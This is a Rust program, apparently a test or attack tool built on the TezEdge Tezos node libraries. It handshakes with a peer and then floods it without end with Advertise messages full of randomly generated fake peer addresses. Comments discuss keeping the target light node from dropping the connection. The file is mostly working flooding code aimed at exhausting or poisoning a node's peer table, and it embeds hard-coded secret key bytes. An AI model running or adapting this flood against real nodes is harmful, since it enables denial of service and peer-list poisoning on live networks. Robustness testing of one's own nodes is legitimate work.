use std::collections::HashSet;
use std::iter::FromIterator;
use std::sync::Arc;
use std::time::{Duration, Instant};

use rand::rngs::SmallRng;
use rand::{Rng, SeedableRng};

use slog::Drain;

use tezedge_state::ShellCompatibilityVersion;

use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use tezos_messages::p2p::encoding::{advertise::AdvertiseMessage, peer::PeerMessage};

use tla_sm::Acceptor;

use crypto::{
    crypto_box::{CryptoKey, PublicKey, SecretKey},
    hash::{CryptoboxPublicKeyHash, HashTrait},
    proof_of_work::ProofOfWork,
};
use hex::FromHex;
use tezedge_state::proposals::ExtendPotentialPeersProposal;
use tezedge_state::{PeerAddress, TezedgeConfig, TezedgeState};
use tezos_identity::Identity;

use tezedge_state::proposer::mio_manager::{MioEvents, MioManager};
use tezedge_state::proposer::{Notification, TezedgeProposer, TezedgeProposerConfig};

fn shell_compatibility_version() -> ShellCompatibilityVersion {
    ShellCompatibilityVersion::new("TEZOS_MAINNET".to_owned(), vec![0], vec![0, 1])
}

fn identity(pkh: &[u8], pk: &[u8], sk: &[u8], pow: &[u8]) -> Identity {
    Identity {
        peer_id: CryptoboxPublicKeyHash::try_from_bytes(pkh).unwrap(),
        public_key: PublicKey::from_bytes(pk).unwrap(),
        secret_key: SecretKey::from_bytes(sk).unwrap(),
        proof_of_work_stamp: ProofOfWork::from_hex(hex::encode(pow)).unwrap(),
    }
}

fn identity_1() -> Identity {
    identity(
        &[
            86, 205, 231, 178, 152, 146, 2, 157, 213, 131, 90, 117, 83, 132, 177, 84,
        ],
        &[
            148, 73, 141, 148, 22, 20, 15, 188, 69, 132, 149, 51, 61, 170, 193, 180, 200, 126, 65,
            159, 87, 38, 113, 122, 84, 249, 182, 198, 116, 118, 174, 28,
        ],
        &[
            172, 122, 207, 58, 254, 215, 99, 123, 225, 15, 143, 199, 106, 46, 182, 179, 53, 156,
            120, 173, 177, 216, 19, 180, 28, 186, 179, 250, 233, 84, 244, 177,
        ],
        &[
            187, 194, 48, 1, 73, 36, 158, 28, 204, 132, 165, 67, 98, 35, 108, 60, 187, 194, 204,
            47, 251, 211, 182, 234,
        ],
    )
}

const SERVER_PORT: u16 = 13632;

fn logger(level: slog::Level) -> slog::Logger {
    let drain = Arc::new(
        slog_async::Async::new(
            slog_term::FullFormat::new(slog_term::TermDecorator::new().build())
                .build()
                .fuse(),
        )
        .chan_size(32768)
        .overflow_strategy(slog_async::OverflowStrategy::Block)
        .build(),
    );

    slog::Logger::root(drain.filter_level(level).fuse(), slog::o!())
}

fn build_tezedge_state() -> TezedgeState {
    // println!("generating identity...");
    // let node_identity = Identity::generate(ProofOfWork::DEFAULT_TARGET).unwrap();
    // dbg!(&node_identity);
    // dbg!(node_identity.secret_key.as_ref().0);

    let node_identity = identity_1();

    // println!("identity generated!");
    let mut tezedge_state = TezedgeState::new(
        logger(slog::Level::Trace),
        TezedgeConfig {
            port: SERVER_PORT,
            disable_mempool: true,
            private_node: false,
            min_connected_peers: 500,
            max_connected_peers: 1000,
            max_pending_peers: 1000,
            max_potential_peers: 100000,
            periodic_react_interval: Duration::from_millis(250),
            peer_blacklist_duration: Duration::from_secs(30 * 60),
            peer_timeout: Duration::from_secs(8),
            pow_target: ProofOfWork::DEFAULT_TARGET,
        },
        node_identity.clone(),
        shell_compatibility_version(),
        Default::default(),
        Instant::now(),
    );

    let peer_addresses = HashSet::<_>::from_iter(
        [
            // Potential peers which state machine will try to connect to.
            vec!["127.0.0.1:9732"]
                .into_iter()
                .map(|x| x.parse().unwrap())
                .collect::<Vec<_>>(),
            // fake peers, just for testing.
            // (0..10000).map(|x| format!(
            //         "{}.{}.{}.{}:12345",
            //         (x / 256 / 256 / 256) % 256,
            //         (x / 256 / 256) % 256,
            //         (x / 256) % 256,
            //         x % 256,
            //     )).collect::<Vec<_>>(),
        ]
        .concat()
        .into_iter(),
    );

    let _ = tezedge_state.accept(ExtendPotentialPeersProposal {
        at: Instant::now(),
        peers: peer_addresses,
    });

    tezedge_state
}

struct IpV4Generator {
    rng: Option<SmallRng>,
    a: u8,
    b: u8,
    c: u8,
    d: u8,
}

impl IpV4Generator {
    pub fn new_linear(a: u8, b: u8, c: u8, d: u8) -> Self {
        IpV4Generator {
            rng: None,
            a,
            b,
            c,
            d,
        }
    }

    pub fn new_random(seed: [u8; 32]) -> Self {
        let small_rng = SmallRng::from_seed(seed);
        IpV4Generator {
            rng: Some(small_rng),
            a: 0,
            b: 0,
            c: 0,
            d: 0,
        }
    }

    pub fn default_linear() -> Self {
        IpV4Generator::new_linear(0, 0, 0, 0)
    }
}

impl Iterator for IpV4Generator {
    type Item = IpAddr;

    fn next(&mut self) -> Option<Self::Item> {
        match &mut self.rng {
            Some(rng) => Some(IpAddr::V4(Ipv4Addr::new(
                rng.gen(),
                rng.gen(),
                rng.gen(),
                rng.gen(),
            ))),
            None => {
                self.d = self.d.wrapping_add(1);

                if self.d == 0 {
                    self.c = self.c.wrapping_add(1);

                    if self.c == 0 {
                        self.b = self.b.wrapping_add(1);

                        if self.b == 0 {
                            self.a = self.a.wrapping_add(1);
                        }
                    }
                }
                Some(IpAddr::V4(Ipv4Addr::new(self.a, self.b, self.c, self.d)))
            }
        }
    }
}
fn main() {
    // TODO: seed chosen by user
    let mut ip_gen = IpV4Generator::new_random([1; 32]);

    let mut proposer = TezedgeProposer::new(
        TezedgeProposerConfig {
            wait_for_events_timeout: Some(Duration::from_millis(250)),
            events_limit: 1024,
        },
        build_tezedge_state(),
        // capacity is changed by events_limit.
        MioEvents::new(),
        MioManager::new(SERVER_PORT),
    );

    loop {
        proposer.make_progress();
        for n in proposer.take_notifications().collect::<Vec<_>>() {
            match n {
                Notification::HandshakeSuccessful { peer_address, .. } => {
                    eprintln!("handshake from {}", peer_address);
                    // Send Bootstrap message.
                    proposer.send_message_to_peer_or_queue(
                        Instant::now(),
                        peer_address,
                        PeerMessage::Bootstrap,
                    );
                }
                Notification::MessageReceived { peer, message } => {
                    eprintln!(
                        "received message from {}, contents: {:?}",
                        peer, message.message
                    );
                    eprintln!("Starting advertise message flood...");
                    let mut vec = Vec::new();

                    for ip in &mut ip_gen {
                        let socket = SocketAddr::new(ip, 9732);
                        vec.push(socket);

                        if vec.len() == 100 {
                            let advertise = AdvertiseMessage::new(&vec);
                            proposer.send_message_to_peer_or_queue(
                                Instant::now(),
                                peer,
                                PeerMessage::Advertise(advertise),
                            );
                            vec.clear();
                        }

                        // Uncomment to avoid broken pipe error but would slow done things
                        // TODO: find a good throughput threshold to call this
                        // TODO2: also even with this enable the light_node closes the connection
                        //        after some time, HEADs could be injected to make it keep going
                        //
                        //proposer.make_progress();
                    }
                }
                Notification::PeerDisconnected { peer } => {
                    eprintln!("DISCONNECTED {}", peer);
                }
                Notification::PeerBlacklisted { peer } => {
                    eprintln!("BLACKLISTED {}", peer);
                }
                _ => {}
            }
        }
    }
}
